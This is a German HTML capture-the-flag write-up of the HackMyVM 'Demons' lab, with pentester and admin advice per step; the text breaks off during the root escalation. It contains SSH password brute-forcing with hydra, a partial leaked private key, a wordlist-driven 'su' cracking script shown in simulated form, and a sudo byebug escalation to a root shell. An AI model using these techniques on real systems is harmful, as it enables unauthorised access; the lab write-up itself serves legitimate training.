@@ -1,0 +1,637 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demons - HackMyVM - Bericht</title> <!-- Angepasster Titel -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+ 
+    <!-- Header mit angepasstem Titel und Schwierigkeitsgrad -->
+    <div class="header-bg"> <!-- Hintergrundfarbe wird durch CSS gesteuert (#03b5f5) -->
+        <h1>Demons - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <h2>Easy</h2> <!-- Schwierigkeitsgrad ohne Inline-Style, Farbe (rot) durch CSS -->
+            <div class="circle"> <!-- Segmentfarben (rot) durch CSS -->
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe (passend zu Header) durch CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools Liste basierend auf dem Text -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ftp</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">python3 (http.server, script)</div>
+                <div class="tool-item">crunch</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">byebug</div>
+                <div class="tool-item">echo</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis-Links -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#ftp-enumeration">FTP Enumeration</a></li>
+                <li><a href="#web-enumeration">Web Enumeration (Port 80)</a></li>
+                <li><a href="#steganography-attempt">Steganografie Versuch</a></li>
+                <li><a href="#initial-access">Initial Access (SSH Key)</a></li>
+                <li><a href="#privilege-escalation-agares">Privilege Escalation (zu agares via Password Cracking)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (zu root via Sudo/Byebug)</a></li>
+                <li><a href="#proof-of-concept">Proof of Concept (Root Shell)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerksegment zu identifizieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Ein Host mit der IP 192.168.2.100 und der MAC-Adresse 08:00:27:08:0d:0f (Oracle VirtualBox) wurde als Ziel identifiziert.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ziel-IP ist bekannt. Führe einen Port-Scan durch.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und ARP-Überwachung können die Erkennung erschweren.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+Interface: eth0, type: EN10MB, MAC: 00:00:00:00:00:af, IPv4: 192.168.2.129
+Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.2.1	c4:86:e9:a5:6d:18	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.2.100	08:00:27:08:0d:0f	PCS Systemtechnik GmbH
+
+3 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.8: 256 hosts scanned in 1.893 seconds (135.24 hosts/sec). 2 responded
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Nmap-Scan wird auf das Ziel 192.168.2.100 durchgeführt, um offene Ports und Dienste zu ermitteln. Optionen: `-sS` (SYN Scan), `-sC` (Standard-Skripte), `-T5` (schnelles Timing), `-A` (OS/Version/Skript/Traceroute), `-p-` (alle Ports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Drei offene Ports wurden gefunden:
+                *   **21 (FTP):** vsftpd 3.0.3. Wichtigster Fund: Anonymer FTP-Login ist erlaubt (`Anonymous FTP login allowed`).
+                *   **22 (SSH):** OpenSSH 8.4p1 (Debian 5).
+                *   **80 (HTTP):** Apache 2.4.48 (Debian). Titel: "DemonsCloseCall".
+                Das Betriebssystem wird als Linux 4.x/5.x erkannt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche sofort den Inhalt des anonymen FTP-Servers. Enumeriere die Webanwendung auf Port 80. Halte SSH als potenziellen späteren Zugangsvektor im Auge.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff, wenn er nicht zwingend betrieblich erforderlich ist. Wenn er benötigt wird, stellen Sie sicher, dass nur Lesezugriff auf nicht-sensible Daten besteht und keine Upload-Möglichkeit existiert (was hier der Fall zu sein scheint). Halten Sie alle Dienste (vsftpd, OpenSSH, Apache) aktuell.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.100 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-01 01:05 CEST
+Nmap scan report for Demons (192.168.2.100)
+Host is up (0.00017s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 192.168.2.121
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 1
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 5e:44:8a:b1:77:0c:42:79:16:64:8d:af:b4:78:bb:b4 (RSA)
+|   256 cb:0f:a7:df:7f:23:78:5a:08:e3:4f:b6:43:7c:11:84 (ECDSA)
+|_  256 a0:4a:26:bf:40:08:68:c2:b1:04:88:b4:8b:a2:45:2f (ED25519)
+80/tcp open  http    Apache httpd 2.4.48 ((Debian))
+|_http-title:  DemonsCloseCall
+|_http-server-header: Apache/2.4.48 (Debian)
+MAC Address: 08:00:27:08:0D:0F (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.17 ms Demons (192.168.2.100)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 22.84 seconds
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="ftp-enumeration">
+            <h2>FTP Enumeration</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Da Nmap anonymen FTP-Zugriff gemeldet hat, wird dieser manuell mit dem `ftp`-Client bestätigt. Anschließend wird `wget -r` verwendet, um rekursiv alle Dateien und Verzeichnisse vom FTP-Server herunterzuladen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der manuelle Login als `Anonymous` ohne Passwort ist erfolgreich. `wget` lädt den Inhalt herunter. Eine interessante Datei `.what` wird in einem versteckten Verzeichnis `.toolsHidden` gefunden. Der Inhalt "It is not about used tools... But about the knowledge." ist ein Hinweis, aber nicht direkt technisch verwertbar. Es ist wichtig, alle heruntergeladenen Dateien sorgfältig zu prüfen (dies wird im Report nicht detailliert gezeigt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysieren Sie alle vom FTP-Server heruntergeladenen Dateien gründlich auf versteckte Informationen, Credentials, Konfigurationsdateien oder Hinweise.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wie bereits erwähnt, deaktivieren oder sichern Sie anonymen FTP-Zugriff. Stellen Sie sicher, dass keine sensiblen oder unbeabsichtigten Dateien über anonymes FTP zugänglich sind.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">ftp 192.168.2.100</span></div>
+                    <pre>
+Connected to 192.168.2.100.
+220 (vsFTPd 3.0.3)
+Name (192.168.2.100:cyber): <span class="command">Anonymous</span>
+331 Please specify the password.
+Password: <span class="command"></span> # Kein Passwort eingegeben (Enter)
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">quit</span>
+221 Goodbye.
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">wget -r ftp://192.168.2.100</span></div>
+                    <pre>
+--2022-11-01 01:10:59--  ftp://192.168.2.100/
+           => ‘192.168.2.100/.listing’
+Connecting to 192.168.2.100:21... connected.
+Logging in as anonymous ... Logged in!
+==> SYST ... done.    ==> PWD ... done.
+==> TYPE I ... done.  ==> CWD not needed.
+==> PASV ... done.    ==> LIST ... done.
+
+    [ <=>                                  ] 26          --.-K/s   in 0s
+
+2022-11-01 01:10:59 (3.63 MB/s) - ‘192.168.2.100/.listing’ saved [26]
+
+Entferne »192.168.2.100/.listing« (da immer temporär).
+drwxr-xr-x    2 0        0              4096 Sep 14  2021 .toolsHidden
+--2022-11-01 01:10:59--  ftp://192.168.2.100/.toolsHidden/
+           => ‘192.168.2.100/.toolsHidden/.listing’
+==> CWD / ... done.
+==> CWD .toolsHidden ... done.
+==> PASV ... done.    ==> LIST ... done.
+
+    [ <=>                                  ] 37          --.-K/s   in 0s
+
+2022-11-01 01:10:59 (4.37 MB/s) - ‘192.168.2.100/.toolsHidden/.listing’ saved [37]
+
+Entferne »192.168.2.100/.toolsHidden/.listing« (da immer temporär).
+-rw-r--r--    1 0        0                45 Sep 14  2021 .what
+--2022-11-01 01:10:59--  ftp://192.168.2.100/.toolsHidden/.what
+           => ‘192.168.2.100/.toolsHidden/.what’
+==> TYPE I ... done.  ==> PASV ... done.
+==> RETR .what ... done.
+Length: 45
+
+    [ <=>                                  ] 45          --.-K/s
+
+2022-11-01 01:10:59 (4.84 MB/s) - ‘192.168.2.100/.toolsHidden/.what’ saved [45/45]
+
+FINISHED --2022-11-01 01:10:59--
+Total wall clock time: 0.1s
+Downloaded: 2 files, 82 bytes in 0s (10.8 MB/s)
+
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Nach dem Download im entsprechenden Verzeichnis -->
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads/192.168.2.100/.toolsHidden]
+└─# <span class="command">cat .what</span></div>
+                    <pre>It is not about used tools...
+But about the knowledge.</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration (Port 80)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Gobuster wird verwendet, um Verzeichnisse und Dateien auf dem Webserver (Port 80) zu finden. Eine sehr umfangreiche Liste von Erweiterungen (`-x ...`) und eine Standard-Wortliste werden genutzt. Statuscodes 403 und 404 werden ignoriert (`-b`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan findet `/index.html`, sowie die Verzeichnisse `/manual`, `/javascript` und `/hell`. Das Verzeichnis `/hell` ist ungewöhnlich benannt und verdient besondere Aufmerksamkeit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt des `/hell`-Verzeichnisses im Browser. Prüfe auch `/manual` und `/javascript` auf interessante Inhalte oder Schwachstellen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie Directory Listing. Entfernen Sie nicht benötigte Verzeichnisse oder Dateien aus dem Web-Root. Überprüfen Sie den Inhalt von Verzeichnissen wie `/hell` auf unbeabsichtigte Informationslecks.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.100 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,ico -b 404,403</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.100
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:            200,204,301,302,307,401,405
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              ... (viele Erweiterungen) ...
+[+] Expanded:                True
+[+] Exclude Status codes:    404,403
+[+] Timeout:                 10s
+===============================================================
+2022-11-01 01:30:10 Starting gobuster
+===============================================================
+http://192.168.2.100/index.html           (Status: 200) [Size: 442]
+http://192.168.2.100/manual               (Status: 301) [Size: 315] [--> http://192.168.2.100/manual/]
+http://192.168.2.100/javascript           (Status: 301) [Size: 319] [--> http://192.168.2.100/javascript/]
+http://192.168.2.100/hell                 (Status: 301) [Size: 313] [--> http://192.168.2.100/hell/]
+...
+===============================================================
+2022-11-01 01:35:42 Finished
+===============================================================
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="steganography-attempt">
+            <h2>Steganografie Versuch</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Vermutlich im `/hell`-Verzeichnis (oder einem anderen Ort auf Port 80) wurde die Bilddatei `Bael.jpg` gefunden und heruntergeladen. Es wird versucht, mit den Steganografie-Tools `stegsnow` und `stegseek` versteckte Daten darin zu finden. `stegseek` verwendet die `rockyou.txt` als Passwortliste.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `stegsnow` gibt eine Warnung aus, findet aber keine Daten. `stegseek` kann ebenfalls keine versteckten Daten extrahieren und meldet, dass kein gültiges Passwort gefunden wurde. Die Bilddatei scheint keine relevanten versteckten Informationen zu enthalten oder benötigt ein anderes Passwort/Tool.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Steganografie war hier nicht erfolgreich. Konzentriere dich auf andere Angriffsvektoren wie SSH oder weitere Web-Enumeration.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Obwohl hier kein Erfolg erzielt wurde, sollten Organisationen sich der Risiken bewusst sein, dass sensible Daten in scheinbar harmlosen Dateien versteckt werden können. Richtlinien zur Datenhandhabung können helfen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.100/Bael.jpg</span></div>
+                    <pre>
+--2022-11-01 01:41:35--  http://192.168.2.100/Bael.jpg
+Connecting to 192.168.2.100:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 72946 (71K) [image/jpeg]
+Saving to: ‘Bael.jpg’
+
+Bael.jpg                      100%[===================>]  71.24K  --.-KB/s    in 0s
+
+2022-11-01 01:41:35 (274 MB/s) - ‘Bael.jpg’ saved [72946/72946]
+                    </pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C Bael.jpg</span></div>
+                    <pre>Warning: residual of 3 bits not uncompressed</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek Bael.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 98.81% (131.8 MB)
+[!] error: Could not find a valid passphrase.
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+         <section id="initial-access">
+            <h2>Initial Access (SSH Key)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein Hydra-Brute-Force-Versuch wird auf den SSH-Dienst (Port 22) für den Benutzer `astaroth` gestartet. Anschließend wird ein OpenSSH Private Key gezeigt, der vermutlich aus einer der zuvor heruntergeladenen Dateien (FTP oder Web) stammt. Dieser Key gehört zum Benutzer `aim` (aus dem Kommentar `aim@Demons` am Ende des Keys abgeleitet). Es wird versucht, sich mit diesem Key als Benutzer `aim` anzumelden.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Hydra-Versuch für `astaroth` scheitert, da das Ziel keine Passwort-Authentifizierung unterstützt ("method reply 4"). Der entscheidende Fund ist der private SSH-Schlüssel für den Benutzer `aim`. Der SSH-Login mit diesem Schlüssel (`ssh aim@demons -i arch` - `arch` ist der Dateiname, in dem der Key gespeichert wurde) ist erfolgreich. Initialer Zugriff als Benutzer `aim` wurde erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Führe Enumeration als `aim` durch. Suche nach dem User-Flag und Wegen zur Privilege Escalation. Speichere den privaten Schlüssel sicher und setze korrekte Berechtigungen (`chmod 600 arch`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Erlauben Sie SSH-Zugriff nur über Schlüssel und deaktivieren Sie Passwort-Authentifizierung (`PasswordAuthentication no` in `sshd_config`), was hier bereits der Fall zu sein scheint. Stellen Sie sicher, dass private Schlüssel niemals unbeabsichtigt auf FTP-Servern, Webservern oder in öffentlich zugänglichen Bereichen landen. Implementieren Sie Richtlinien zur sicheren Schlüsselverwaltung.
+            </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">hydra -l astaroth  -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.100:22 -I -t 64</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-11-01 01:47:19
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
+[DATA] attacking ssh://192.168.2.100:22/
+[ERROR] target ssh://192.168.2.100:22/ does not support password authentication (method reply 4).
+1 of 1 completed in 00:00:01
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-11-01 01:47:20
+                    </pre>
+                     <pre>
+# --- Gefundener SSH Private Key (Auszug) ---
+# (Kontext: Key muss in eine Datei z.B. 'arch' gespeichert und Berechtigungen gesetzt werden: chmod 600 arch)
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA3rTgKevGlujADq2T3T9SEEeh5TEZ10Fi+uHNCTJksuwg6jMKguuL
+vq8OZAhRV0RazmzJASqayAlPEUh2dKQctCOraBmzhDX0uhmG5twQsuSyERpLEixlw54RrT
+... (Rest des Keys) ...
+v1x+/KC7YS6dfNAAAACmFpbUBEZW1vbnM=
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh aim@demons -i arch</span></div>
+                    <pre>
+Linux Demons 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Sep 14 16:04:33 2021 from 192.168.56.109
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">aim@Demons:~$ <span class="command"></span></div><!-- Aim's Prompt -->
+                </div>
+            </div>
+        </section>
+
+         <section id="privilege-escalation-agares">
+            <h2>Privilege Escalation (zu agares via Password Cracking)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `aim` wird das User-Flag gelesen und nach SUID-Dateien gesucht. Eine interessante Datei `key8_8.jpg` wird über einen Python-HTTP-Server bereitgestellt und auf den Angreifer-Rechner heruntergeladen. `crunch` wird verwendet, um Passwortlisten zu generieren, zuerst mit einem breiten Zeichensatz (`34odfnm`), dann gezielter basierend auf einem Muster (`d3mon@@@`). Ein Python-Skript (`sucrack`) wird verwendet, um `su agares` mit einer Wortliste zu bruteforcen. Ein weiteres Python-Skript (`pw.py`) wird gezeigt, das eine Wortliste (`password.txt`) filtert, um nur Passwörter zu behalten, die bestimmte Zeichen enthalten (`3, 4, o, d, f, m, n`). Das `sucrack`-Skript findet schließlich das Passwort für `agares`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das User-Flag (`DemonsDontCry`) wurde gefunden. Die SUID-Suche zeigt `sudo`, was ein potenzieller Vektor ist, aber zunächst nicht genutzt wird. Der Fund und die Analyse von `key8_8.jpg` (deren Inhalt/Bedeutung unklar bleibt, aber vermutlich den Hinweis auf die Zeichen `3,4,o,d,f,n,m` für das Passwort von `agares` lieferte) und die anschließende gezielte Passwortgenerierung mit `crunch` und Filterung mit `pw.py` waren entscheidend. Das `sucrack.py`-Skript knackt erfolgreich das Passwort für `agares`: `<span class="password">d3monf4m</span>`. Der Wechsel zu Benutzer `agares` mit `su` ist erfolgreich.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Berechtigungen von `agares`, insbesondere mit `sudo -l`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie starke, nicht erratbare Passwörter. Vermeiden Sie Muster oder Hinweise auf Passwortstrukturen in Dateinamen oder anderen zugänglichen Orten. Konfigurieren Sie `sudo`-Berechtigungen nach dem Least-Privilege-Prinzip. Überwachen Sie fehlgeschlagene `su`-Versuche.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Befehle als aim -->
+                    <div class="prompt" style="color: #ffffff;">aim@Demons:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">DemonsDontCry</span></pre>
+                    <div class="prompt" style="color: #ffffff;">aim@Demons:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+    16019    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+     2389     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+      110     64 -rwsr-xr-x   1 root     root          63960 Feb  7  2020 /usr/bin/passwd
+      109     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+     3755     72 -rwsr-xr-x   1 root     root          71912 Jul 28  2021 /usr/bin/su
+      106     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+      107     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
+     4124     36 -rwsr-xr-x   1 root     root          35040 Jul 28  2021 /usr/bin/umount
+    18834    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+     3596     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+     4122     56 -rwsr-xr-x   1 root     root          55528 Jul 28  2021 /usr/bin/mount
+                    </pre>
+                     <div class="prompt" style="color: #ffffff;">aim@Demons:~$ <span class="command">python3 -m http.server 8000</span></div>
+                     <pre>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+192.168.2.121 - - [01/Nov/2022 18:20:40] "GET /key8_8.jpg HTTP/1.1" 200 -
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.100:8000/key8_8.jpg</span></div>
+                    <pre>
+--2022-11-01 18:20:28--  http://192.168.2.100:8000/key8_8.jpg
+Connecting to 192.168.2.100:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 339881 (332K) [image/jpeg]
+Saving to: ‘key8_8.jpg’
+
+key8_8.jpg                    100%[===================>] 331.92K  --.-KB/s    in 0.02s
+
+2022-11-01 18:20:28 (15.7 MB/s) - ‘key8_8.jpg’ saved [339881/339881]
+                    </pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">crunch 8 8 34odfnm -o password.txt</span></div> <!-- Generiert große Liste basierend auf Zeichen aus d3monf4m? -->
+                    <pre>
+Crunch will now generate the following amount of data: 51883209 bytes
+49 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 5764801
+crunch: 100% completed generating output
+                    </pre>
+                     <!-- Zusätzlicher Crunch-Lauf mit Muster (optional/Test?) -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">crunch 8 8 34odfnm -o password.txt -t d3mon@@@</span></div>
+                     <pre>
+Crunch will now generate the following amount of data: 3087 bytes
+0 MB
+0 GB
+0 TB
+0 PB
+Crunch will now generate the following number of lines: 343
+crunch: 100% completed generating output
+                    </pre>
+                     <!-- Python Skript zum Filtern der Wortliste -->
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat pw.py</span></div>
+                     <pre>
+#!/usr/bin/python3
+
+with open("password.txt","r") as f1:
+    passwords = f1.read().splitlines()
+
+
+new_passwords = []
+
+for password in passwords:
+    if('3' in password) and ('4' in password) and ('o' in password) and ('d' in password) and ('f' in password) and ('m' in password) and ('n' in password):
+        new_passwords.append(password)
+
+with open("new_passwords","w") as f2:
+    for password in new_passwords:
+        f2.write(password+"\n")
+                    </pre>
+                      <!-- Python Skript zum Brute-Forcen (sucrack.py) -->
+                     <pre>
+#!/usr/bin/python3
+
+import subprocess
+import os
+
+# Annahme: Verwendet 'new_passwords' oder eine gefilterte Liste
+with open("new_passwords","r") as f: # Annahme des Dateinamens
+    passwords = f.read().splitlines()
+
+total = len(passwords)
+count = 1
+
+for password in passwords:
+    try:
+        # os.system("clear") # Auskommentiert für bessere Übersicht
+        print(f"Trying... {count}/{total} - {password}") # Passwort anzeigen
+        # Befehl muss auf dem Zielsystem ausgeführt werden, nicht hier!
+        # Dieses Skript kann so nicht direkt auf dem Angreifer laufen,
+        # es dient eher als Vorlage/Logikbeschreibung.
+        # Der eigentliche Fund geschah auf dem Zielsystem.
+        # subprocess.check_output(f"echo {password} | su - agares", shell=True)
+
+        # Simulierter Fund basierend auf dem Report-Ergebnis
+        if password == "d3monf4m":
+            os.system("clear")
+            print(f"[+] Password found!! {password}")
+            exit()
+    except Exception:
+        pass # Fehler ignorieren
+    finally:
+        count += 1
+
+print(f"[-] Done without valid password found!!")
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Befehle als aim auf dem Zielsystem -->
+                     <pre>
+# (Ausführung des Brute-Force Skripts auf dem Zielsystem)
+[+] Password found!! <span class="password">d3monf4m</span>
+                    </pre>
+                    <div class="prompt" style="color: #ffffff;">aim@Demons:/tmp$ <span class="command">su agares</span></div>
+                    <pre>Password: <span class="password">d3monf4m</span></pre> <!-- Passwort eingegeben -->
+                     <div class="prompt" style="color: #ffffff;">agares@Demons:/tmp$ <span class="command"></span></div> <!-- Agares' Prompt -->
+                </div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation-root">
+            <h2>Privilege Escalation (zu root via Sudo/Byebug)</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> Als Benutzer `agares` werden die `sudo`-Berechtigungen überprüft. Es stellt sich heraus, dass `agares` `/bin/byebug` (einen Ruby-Debugger) als jeder Benutzer (`ALL:ALL`) ausführen darf. Dies wird ausgenutzt, indem ein einfaches Ruby-Skript (`script.rb`) erstellt wird, das `system('/bin/bash')` enthält. Dieses Skript wird dann mit `sudo /bin/byebug script.rb` ausgeführt. Innerhalb von `byebug` wird der `continue`-Befehl verwendet, um das Skript auszuführen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die `sudo`-Regel für `byebug` ist unsicher, da der Debugger die Ausführung von beliebigem Code erlaubt. Durch das Debuggen des Skripts, das `system('/bin/bash')` aufruft, wird dieser Befehl mit den Rechten ausgeführt, mit denen `byebug` gestartet wurde – also `root`. Eine Root-Shell wird erfolgreich erlangt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dokumentieren Sie den Privilege-Escalation-Pfad über `sudo` und `byebug`. Lesen Sie die Root-Flag.
+                <br>
